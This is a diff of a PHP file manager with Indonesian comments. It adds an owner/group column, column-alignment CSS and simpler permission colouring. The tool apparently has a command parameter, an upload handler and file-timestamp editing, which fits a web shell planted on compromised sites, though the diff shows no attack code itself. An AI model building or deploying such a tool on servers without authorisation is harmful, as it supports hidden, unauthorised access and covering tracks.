@@ -264,17 +264,19 @@
         vertical-align: middle;
     }
     
-    /* Hover effects untuk Name, Size, Modified */
+    /* Hover effects untuk Name, Size, Modified, dan Owner */
     .table tbody tr:hover td:nth-child(1),
     .table tbody tr:hover td:nth-child(2),
-    .table tbody tr:hover td:nth-child(3) {
+    .table tbody tr:hover td:nth-child(3),
+    .table tbody tr:hover td:nth-child(4) {
         color: #ffc107 !important;
     }
     
     .table tbody tr:hover td:nth-child(1) a,
     .table tbody tr:hover td:nth-child(1) i,
     .table tbody tr:hover td:nth-child(2),
-    .table tbody tr:hover td:nth-child(3) {
+    .table tbody tr:hover td:nth-child(3),
+    .table tbody tr:hover td:nth-child(4) {
         color: #ffc107 !important;
     }
     
@@ -576,6 +578,53 @@
         border: 1px solid #ffc107;
     }
     
+    /* Perataan kolom tabel */
+    .table th {
+        text-align: center;
+        vertical-align: middle;
+    }
+
+    .table td {
+        vertical-align: middle;
+    }
+
+    /* Kolom Size, Modified, Owner, Perms, Actions - header dan data di tengah */
+    .table th:nth-child(2),
+    .table th:nth-child(3),
+    .table th:nth-child(4),
+    .table th:nth-child(5),
+    .table th:nth-child(6),
+    .table td:nth-child(2),
+    .table td:nth-child(3),
+    .table td:nth-child(4),
+    .table td:nth-child(5),
+    .table td:nth-child(6) {
+        text-align: center;
+    }
+
+    /* Kolom Name - header di tengah, data di kiri */
+    .table th:nth-child(1) {
+        text-align: center;
+    }
+
+    .table td:nth-child(1) {
+        text-align: left;
+    }
+
+    /* Ikon dan link di kolom Name tetap rata kiri */
+    .table td:nth-child(1) i,
+    .table td:nth-child(1) a {
+        text-align: left;
+    }
+
+/* Mengatur lebar kolom */
+.table th:nth-child(1), .table td:nth-child(1) { width: 35%; }  /* Name */
+.table th:nth-child(2), .table td:nth-child(2) { width: 10%; }  /* Size */
+.table th:nth-child(3), .table td:nth-child(3) { width: 20%; }  /* Modified */
+.table th:nth-child(4), .table td:nth-child(4) { width: 15%; }  /* Owner */
+.table th:nth-child(5), .table td:nth-child(5) { width: 8%; }   /* Perms */
+.table th:nth-child(6), .table td:nth-child(6) { width: 12%; }  /* Actions */
+    
     /* Responsive */
     @media (max-width: 768px) {
         .main-container {
@@ -618,35 +667,22 @@ function isWritable($path)
 // Modifikasi fungsi getPermsColorClass untuk membedakan permission yang bisa diedit
 function getPermsColorClass($perms, $path)
 {
-    $perms_value = (int)$perms;
+    // Cek apakah file/folder bisa dibaca
+    $readable = is_readable($path);
     $writable = isWritable($path);
     
-    // Jika tidak writable, beri warna abu-abu
-    if (!$writable) {
-        return 'perms-not-writable';
+    // HIJAU: bisa ditulis
+    if ($writable) {
+        return 'perms-safe';
     }
     
-    if ($perms_value <= 644) {
-        return 'perms-safe';
-    } elseif ($perms_value >= 645 && $perms_value <= 654) {
-        return 'perms-info';
-    } elseif ($perms_value >= 655 && $perms_value <= 664) {
-        return 'perms-warning';
-    } elseif ($perms_value >= 665 && $perms_value <= 666) {
+    // MERAH: bisa dibaca tapi tidak bisa ditulis (read-only)
+    if ($readable) {
         return 'perms-danger';
-    } elseif ($perms_value == 755) {
-        return 'perms-safe';
-    } elseif ($perms_value >= 767 && $perms_value <= 777) {
-        return 'perms-danger';
-    } else {
-        if (substr($perms, -1) >= 6) {
-            return 'perms-warning';
-        } elseif (substr($perms, -2, 1) >= 6) {
-            return 'perms-info';
-        } else {
-            return 'perms-safe';
-        }
     }
+    
+    // ABU-ABU: tidak bisa dibaca dan tidak bisa ditulis
+    return 'perms-not-writable';
 }
 
 // Fungsi untuk mengubah permissions
@@ -1417,7 +1453,6 @@ if (isset($_GET['d']) && isset($_GET['q'])) {
         }
     }
 }
-
 // Tampilkan tabel file hanya jika tidak ada form action yang aktif
 if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfile']) && !isset($_GET['upxc']) && !isset($_GET['r']) && !isset($_GET['t']) && !isset($_GET['e']) && !isset($_GET['cmd']) && !isset($_GET['chmod'])) {
     echo '<div class="main-container">';
@@ -1446,6 +1481,7 @@ if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfi
       <th scope="col">Name</th>
       <th scope="col">Size</th>
       <th scope="col">Modified</th>
+      <th scope="col">Owner</th>
       <th scope="col">Perms</th>
       <th scope="col">Actions</th>
     </tr>
@@ -1456,10 +1492,22 @@ if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfi
     foreach ($folders as $folder) {
         $perms = "0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3);
         $color_class = getPermsColorClass($perms, PATH . "/" . $folder);
+        $owner_info = '';
+        if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
+            $owner_id = fileowner(PATH . "/" . $folder);
+            $group_id = filegroup(PATH . "/" . $folder);
+            $owner = posix_getpwuid($owner_id);
+            $group = posix_getgrgid($group_id);
+            $owner_info = $owner['name'] . '/' . $group['name'];
+        } else {
+            $owner_info = fileowner(PATH . "/" . $folder) . '/' . filegroup(PATH . "/" . $folder);
+        }
+        
         echo "    <tr>
       <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
       <td><b>---</b></td>
       <td>" . date("F d Y H:i:s", filemtime(PATH . "/" . $folder)) . "</td>
+      <td>" . $owner_info . "</td>
       <td><span class='{$color_class}'>" . $perms . "</span></td>
       <td>
         <a title='Ubah Tanggal' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . urlencode($folder) . "'><i class='fa-regular fa-calendar'></i></a>
@@ -1477,6 +1525,17 @@ if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfi
         $color_class = getPermsColorClass($perms, PATH . "/" . $file);
         $ext = strtolower(fileExtension($file));
         
+        $owner_info = '';
+        if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
+            $owner_id = fileowner(PATH . "/" . $file);
+            $group_id = filegroup(PATH . "/" . $file);
+            $owner = posix_getpwuid($owner_id);
+            $group = posix_getgrgid($group_id);
+            $owner_info = $owner['name'] . '/' . $group['name'];
+        } else {
+            $owner_info = fileowner(PATH . "/" . $file) . '/' . filegroup(PATH . "/" . $file);
+        }
+        
         $actions = '
         <a title="Edit File" href="?q=' . urlencode(encodePath(PATH)) . '&e=' . urlencode($file) . '"><i class="fa-solid fa-file-pen"></i></a>
         <a title="Rename" href="?q=' . urlencode(encodePath(PATH)) . '&r=' . urlencode($file) . '"><i class="fa-sharp fa-regular fa-pen-to-square"></i></a>
@@ -1493,6 +1552,7 @@ if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfi
           <td>" . fileIcon($file) . "<a href='?q=" . urlencode(encodePath(PATH)) . "&e=" . urlencode($file) . "' class='file-name-link'>" . $file . "</a></td>
           <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
           <td>" . date("F d Y H:i:s", filemtime(PATH . "/" . $file)) . "</td>
+          <td>" . $owner_info . "</td>
           <td><span class='{$color_class}'>" . $perms . "</span></td>
           <td>" . $actions . "</td>
     </tr>
@@ -1510,5 +1570,4 @@ if (isset($_GET['p']) && !isset($_GET['createfolder']) && !isset($_GET['createfi
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
 </body>
-
 </html>
